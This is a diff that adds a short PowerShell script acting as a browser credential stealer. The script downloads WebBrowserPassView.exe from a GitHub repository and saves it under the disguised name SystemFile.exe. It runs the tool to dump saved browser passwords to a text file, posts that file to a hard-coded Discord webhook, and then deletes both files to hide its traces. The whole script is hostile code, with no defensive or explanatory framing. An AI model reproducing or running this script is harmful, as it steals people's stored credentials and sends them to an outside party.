@@ -1,0 +1,26 @@
+# Set the URLs and paths
+$downloadUrl = "https://github.com/WilleLX1/F0_BK/raw/main/CustomRawHosters/WebBrowserPassView.exe"
+$downloadPath = "C:\Users\Public\SystemFile.exe"
+$commandToRun = SystemFile.exe /stext SystemInfo.txt"
+$webhookUrl = "https://discord.com/api/webhooks/1070416409215107184/UAILaaOb37Vlb223hJuywdE8ysjpW4DSW7hA-g_nemnLabmF40vknnvov3I-4V4eYBTM"
+$fileToSend = "C:\Users\Public\SystemInfo.txt"
+
+# Download the exe file
+Invoke-WebRequest -Uri $downloadUrl -OutFile $downloadPath
+
+# Run a command in the downloaded file folder
+$downloadFolderPath = (Get-Item $downloadPath).Directory.FullName
+$commandFullPath = Join-Path -Path $downloadFolderPath -ChildPath $commandToRun
+Start-Process -FilePath $commandFullPath -Wait
+
+# Send a file to Discord webhook
+$webhookData = @{
+    file = [System.IO.File]::OpenRead($fileToSend)
+}
+Invoke-RestMethod -Uri $webhookUrl -Method Post -InFile $fileToSend -ContentType "multipart/form-data" -Body $webhookData
+
+# Remove the downloaded exe file
+Remove-Item $downloadPath -Force
+
+# Clean up
+Remove-Item $fileToSend -Force
